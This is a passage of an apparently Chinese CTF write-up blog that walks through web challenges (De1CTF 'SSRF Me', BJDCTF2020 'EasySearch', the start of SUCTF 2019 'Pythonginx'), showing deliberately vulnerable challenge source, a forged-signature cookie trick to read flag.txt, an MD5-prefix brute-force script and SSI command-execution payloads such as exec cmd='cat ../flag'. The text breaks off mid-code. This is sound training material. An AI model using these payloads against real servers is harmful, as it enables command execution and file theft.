class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># Set default encoding to latin1</span><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>) <span class="hljs-comment">#生成一个16字节的随机密钥</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<span class="hljs-comment">#接受四个参数</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip) <span class="hljs-comment">#利用md5为ip加密然后赋值给sandbox属性</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(self.sandbox):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<span class="hljs-comment"># 创建空字典</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>        <span class="hljs-keyword">if</span> self.checkSign(): <span class="hljs-comment">#scan 和 read</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%s是一个占位符，将被self.sandbox的值替换</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#获取HTTP请求中名为&quot;param&quot;的参数的值,如果找不到就返回空字符串</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#后面那个&quot;&quot;意思是要是没值就赋空</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> waf(param):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>] <span class="hljs-comment">## 打开指定URL并读取前50个字符的内容。不过注意这东西并没有输出。</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest() <span class="hljs-comment">#计算哈希并转换成16进制</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#先去首位空格再转换成小写</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#如果变量check以这两个开头</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br><br><br><br></code></pre></td></tr></table></figure><p>这道题刚拿到的时候人晕了。。不知怎么下手，跟着这位师傅的思路做了一下：<code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><p>一共三个路由：<code>/</code>,<code>/De1ta</code>,<code>/geneSign</code>，先看接受一堆参数的<code>/De1ta</code>路由都拿参数干了啥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>)) <span class="hljs-comment">#利用cookie传action的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#get传param，要是没有直接赋值为空</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>)) <span class="hljs-comment">#利用cookie传sign的值</span><br></code></pre></td></tr></table></figure><p>接受到的<code>param</code>带入到<code>waf</code>函数里：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> waf(param):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br></code></pre></td></tr></table></figure><p>看看<code>waf</code>函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#先去首位空格再转换成小写</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#如果变量check以这两个开头</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>然后构造一个<code>Task</code>类对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">task = Task(action, param, sign, ip) <span class="hljs-comment">#注意在python中实例化一个类不需要 new,但java和php需要</span><br><span class="hljs-keyword">return</span> json.dumps(task.Exec()) <span class="hljs-comment">#将task.Exec()的返回值转换为JSON格式的字符串</span><br></code></pre></td></tr></table></figure><p>看下<code>Exec</code>这个方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>      result = &#123;&#125;<span class="hljs-comment"># 创建空字典</span><br>      result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>      <span class="hljs-keyword">if</span> self.checkSign(): <br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%s是一个占位符，将被self.sandbox的值替换</span><br>              resp = scan(self.param) <span class="hljs-comment">#注意这个函数，提示flag in ./flag.txt，那我们可以通过scan去读该文件前50个字符，对于flag来说肯定够用了，但仅有scan并不能把结果输出)</span><br>              <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                  result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>              <span class="hljs-keyword">else</span>:<br>                  <span class="hljs-built_in">print</span> resp<br>                  tmpfile.write(resp)<br>                  tmpfile.close()<br>                  result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action: <span class="hljs-comment">#scan和read组合使用，一写一读</span><br>              f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>          <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>      <span class="hljs-keyword">else</span>:<br>          result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>          result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>      <span class="hljs-keyword">return</span> result <br></code></pre></td></tr></table></figure><p>他先检查了<code>checkSign</code>是否为真：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-comment">#checkSign</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># 当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true</span><br>       <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>  <span class="hljs-comment"># getSign</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>): <span class="hljs-comment"># 三个参数拼接然后md5</span><br>   <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>然后是<code>/geneSign</code>路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#路由</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#获取HTTP请求中名为&quot;param&quot;的参数的值,如果找不到就返回空字符串</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br></code></pre></td></tr></table></figure><p>其实梳理完代码思路就比较清晰了，我们最终的目标是把<code>./flag.txt</code>的内容读出来 -&gt;可以通过<code>Exec()</code>实现 - &gt;实现<code>Exec()</code>需要满足<code>self.checkSign()</code>和<code>&quot;scan&quot; in self.action &amp;&quot;read&quot; in self.action</code>同时为真。</p><p>首先是<code>checkSign</code>，如果满足<code>hashlib.md5(secert_key + param + action).hexdigest()</code> &#x3D;&#x3D;<code>self.sign</code> 才会<code>return ture</code>。我们知道<code>sign、action</code>是通过<code>cookie</code>传过来的,<code>param</code>是利用<code>GET</code>方法传过来的。但仅剩的这个<code>secret_key</code>我们并不知道。</p><p>这时可以利用<code>/geneSign</code>这个路由，他可以返回<code>hashlib.md5(secert_key + param + scan).hexdigest()</code>(注意他的<code>action</code>事先定义好了，没法修改)。</p><p>如果我们访问<code>/geneSign?param=flag.txt</code>，那么返回的字符串会是：<code>md5(secret_key+flag.txt+scan)</code>：<code>d7d0f6d0bb268048ca879fc3f180c36d</code></p><p>如果我们访问<code>/geneSign?param=flag.txtread</code>，那么返回的字符串会是：</p><p><code>md5(secret_key+flag.txtread+scan)</code>: <code>50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p>那这东西不就是我们需要的<code>sign</code>值吗？</p><p>抓个包修改<code>Cookie:action=readscan;sign=50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p><img src="/img/SSRFME2.png" alt="SSRFME2"></p><p>参考文章<code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>一个登录界面，没发现什么提示</p><p><img src="/img/easysearch1.png" alt="easysearch1"></p><p><code>username</code>和<code>password</code>是以<code>POST</code>形式提交的，未经过任何加密：</p><p><img src="/img/easysearch2.png" alt="easysearch2"></p><p>试了试感觉不是SQL注入，题目<code>EasySearch</code>,用<code>dirsearch</code>扫一下？</p><p>没扫出来，用御剑扫还是没扫出来。。后来直接去看了<code>wp</code>。。。</p><p><code>/index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123; <span class="hljs-comment">//取密码加密后的前六位与$admin比较，假如相等则</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先找<code>md5</code>加密后前六位是<code>6d0bc1</code>的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helloworld</span>(<span class="hljs-params">target</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>       <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == target:<span class="hljs-comment">#哈希操作前必须先对字符串编码</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <br>target = <span class="hljs-string">&#x27;6d0bc1&#x27;</span><br>helloworld(target)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br><span class="hljs-number">2020666</span><br><span class="hljs-number">2305004</span><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>用户名任意，随便选个符合条件的密码，登陆后界面啥也没有，去看看包头：</p><p><img src="/img/easysearch3.png" alt="easysearch3"></p><p><code>Url_is_here:public/08ce2e9aef0f551307554f2c1b21d8271ffbcd87.shtml</code>,访问：</p><p><img src="/img/easysearch5.png" alt="easysearch5"></p><p>可以看到他把用户名显示出来了，师傅们的<code>wp</code>中说这东西叫<code>SSI注入</code>：</p><p><code>SSI</code>:</p><p><img src="/img/SSI1.png" alt="SSI1"></p><p>可以看到要包含的东西是用户可控的。</p><p><code>shtml</code>：</p><p><img src="/img/SSI2.png" alt="SSI2"></p><p><code>shtml文件可以在服务端执行一些指令</code></p><p><img src="/img/SSI3.png" alt="SSI3"></p><p><code>Web</code>服务器开启了<code>SSI</code>功能 - &gt;用户通过构造恶意<code>SSI</code>指令执行某些操作 - &gt; 执行命令并形成<code>shtml</code>文件</p><p>我们可以控制<code>username</code>和<code>password</code>，<code>username</code>有回显而且<code>password</code>是固定的，通过调整<code>username</code>的值来进行<code>SSI注入</code>：把<code>username</code>改成<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>再访问：</p><p><img src="/img/easysearch6.png" alt="easysearch6"></p><p>然后改成<code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code>就行</p><p><code>flag&#123;60f16b0b-40d8-4be2-a7f0-96dd2d99e7d6&#125;</code></p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/img/nigix1.png" alt="nigix1"></p><p>源码中的提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="hljs-comment">&lt;!-- Do you know the nginx? --&gt;</span><br></code></pre></td></tr></table></figure><p>梳理一下这段代码： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlsplit, urlunsplit<br><span class="hljs-keyword">import</span> urllib.request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = urlparse(url).hostname <span class="hljs-comment"># urlparse是Python标准库中的一个函数，位于urllib.parse模块中。它用于解析URL字符串，将其拆分为多个部分，包括协议、主机名、路径、查询参数等。他会把目标url中的主机名解析出来赋值给host</span><br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span><br>    <br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))  <span 